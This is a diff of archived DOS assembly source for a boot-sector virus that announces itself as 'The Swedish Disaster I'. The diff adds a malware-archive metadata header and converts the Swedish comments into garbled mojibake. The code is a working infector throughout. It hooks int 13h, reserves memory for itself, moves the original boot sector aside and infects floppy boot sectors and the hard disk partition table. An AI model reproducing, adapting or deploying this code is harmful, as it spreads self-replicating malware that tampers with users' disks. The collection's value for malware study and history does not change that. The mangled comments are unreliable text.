@@ -1,7 +1,18 @@
-; Senast „ndrad 891213.
+; ------------------------------------------------------------
+; name      T
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
+; Senast ï¿½ndrad 891213.
 ;
-; L„gger gamla bootsectorn p† sida 1, sp†r 0, sector 3.
-;                             sida 0, sp†r 0, sector 7 p† HD.
+; Lï¿½gger gamla bootsectorn pï¿½ sida 1, spï¿½r 0, sector 3.
+;                             sida 0, spï¿½r 0, sector 7 pï¿½ HD.
 
 
 Code	Segment
@@ -11,18 +22,18 @@ Code	Segment
 Main	Proc	Far
 	db	0EAh,05h,00h,0C0h,07h
 
-	jmp	Near Ptr Init		; Hoppa f”rbi variabler och nya int13h
+	jmp	Near Ptr Init		; Hoppa fï¿½rbi variabler och nya int13h
 
 
 ; Variabler
 
 Old13h	dd	0			; Gamla vectorn till diskfunktionerna.
 
-TmpVec	dd	0			; Tempor„r vec. vid „ndring av int 13.
+TmpVec	dd	0			; Temporï¿½r vec. vid ï¿½ndring av int 13.
 
 BootPek	dw	0003h,0100h
 
-; Slut p† variabler
+; Slut pï¿½ variabler
 
 
 
@@ -37,12 +48,12 @@ Int13h	Proc	Near
 	cmp	ah,02h
 	jb	Exit
 	cmp	ah,04h
-	ja	Exit     		; Kolla s† att func. 2-4
+	ja	Exit     		; Kolla sï¿½ att func. 2-4
 
 	sub	ax,ax
 	mov	ds,ax
 	mov	bx,043Fh		; Motor status byte.
-	test	Byte Ptr [bx],01h 	; Testa om motorn i A: „r p†..
+	test	Byte Ptr [bx],01h 	; Testa om motorn i A: ï¿½r pï¿½..
 	jnz	Exit			; Nej,hoppa till gamla int 13h
 
 	call	Smitta
@@ -65,20 +76,20 @@ Smitta	Proc	Near
 	push	cs
 	pop	ds
 
-	mov	si,0004h		; Max antal f”rs”k.
+	mov	si,0004h		; Max antal fï¿½rsï¿½k.
 
-Retry:	mov	ax,0201h		; L„s en sector
-	mov	bx,0200h                ; L„s hit.
-	mov	cx,0001h		; Sp†r 0 Sector 1
+Retry:	mov	ax,0201h		; Lï¿½s en sector
+	mov	bx,0200h                ; Lï¿½s hit.
+	mov	cx,0001h		; Spï¿½r 0 Sector 1
 	sub	dx,dx			; Sida 0 Drive 0
 	pushf
-	call	[Old13h] 		; L„s in booten.
+	call	[Old13h] 		; Lï¿½s in booten.
 
 	jnc	OK
 
 	dec	si
 	jz	Slut 			; Hoppa ur om fel.
-	jmp	Retry 			; F”rs”k max 4 g†nger.
+	jmp	Retry 			; Fï¿½rsï¿½k max 4 gï¿½nger.
 
 
 OK:	mov	si,0200h
@@ -94,7 +105,7 @@ OK:	mov	si,0200h
 
 L2:	mov	ax,0301h                ; Skriv en sector.
 	mov	bx,0200h
-	mov	cx,0003h		; Sp†r 0 Sector 3
+	mov	cx,0003h		; Spï¿½r 0 Sector 3
 	mov	dx,0100h		; Sida 1 Drive 0
 	pushf
 	call    [Old13h]		; Flytta boot sectorn.
@@ -116,12 +127,12 @@ Smitta	Endp
 Int13h	Endp
 
 Init:	sub	ax,ax
-	mov	ds,ax			; Nollar ds f”r att „ndra vect.
+	mov	ds,ax			; Nollar ds fï¿½r att ï¿½ndra vect.
 
  	cli
  	mov	ss,ax
  	mov	sp,7C00h
- 	sti				; S„tter upp en ny stack.
+ 	sti				; Sï¿½tter upp en ny stack.
 
 	push	cs
 	pop	es
@@ -135,7 +146,7 @@ Init:	sub	ax,ax
 	mov	ax,[bx]			; Minnesstorleken till ax.
 	dec	ax
 	dec	ax
-	mov	[bx],ax			; Reservera plats f”r viruset.
+	mov	[bx],ax			; Reservera plats fï¿½r viruset.
 
 	mov	cl,06h
 	shl	ax,cl
@@ -165,11 +176,11 @@ Init:	sub	ax,ax
 	ret				; Hoppa till viruset.
 
 Here:	sub	ax,ax
-	int	13h      		; terst„ll driven
+	int	13h      		; ï¿½terstï¿½ll driven
 
 	sub	ax,ax
 	mov	es,ax
-	mov	ax,0201h                ; L„s en sector funk.
+	mov	ax,0201h                ; Lï¿½s en sector funk.
 	mov	bx,7C00h		; Hit laddas booten normalt.
 	mov	cx,BootPek
 	mov	dx,BootPek+2
@@ -181,14 +192,14 @@ Here:	sub	ax,ax
 	mov	bx,0200h
 	mov	cx,0001h
 	mov	dx,0080h
-	int	13h                     ; L„s in partions tabellen.
+	int	13h                     ; Lï¿½s in partions tabellen.
 	jc	Over
 	push	cs
 	pop	ds
 	mov	si,0200h
 	sub	di,di
 	lodsw
-	cmp	ax,[di]			; Kolla om den „r smittad.
+	cmp	ax,[di]			; Kolla om den ï¿½r smittad.
 	jne	HdInf
 	lodsw
 	cmp	ax,[di+2]
@@ -200,7 +211,7 @@ Over:	mov	BootPek,0003h
 	push	bx
 	mov	bx,7C00h
 	push	bx
-	ret				; K”r den gamla booten.
+	ret				; Kï¿½r den gamla booten.
 
 HdInf:	mov	BootPek,0007h
 	mov	BootPek+2,0080h
@@ -234,7 +245,7 @@ HdInf:	mov	BootPek,0007h
 	test	Byte Ptr es:[046Ch],07h
 	jnz	HdInf1
 
-	mov	si,Offset Txt           ; Detta utf”rs bara om man bootar fr†n
+	mov	si,Offset Txt           ; Detta utfï¿½rs bara om man bootar frï¿½n
 	cld                             ; diskett.
 Foo1:	lodsb
 	cmp	al,00h
@@ -247,7 +258,7 @@ Foo1:	lodsb
 HdInf1:	jmp	Over
 
 
-Slutet	Label	Byte			; Anv„nds f”r att veta var slutet „r.
+Slutet	Label	Byte			; Anvï¿½nds fï¿½r att veta var slutet ï¿½r.
 
 
 Txt	db	07h,0Ah,0Dh,'The Swedish Disaster I',0Ah,0Dh,00h
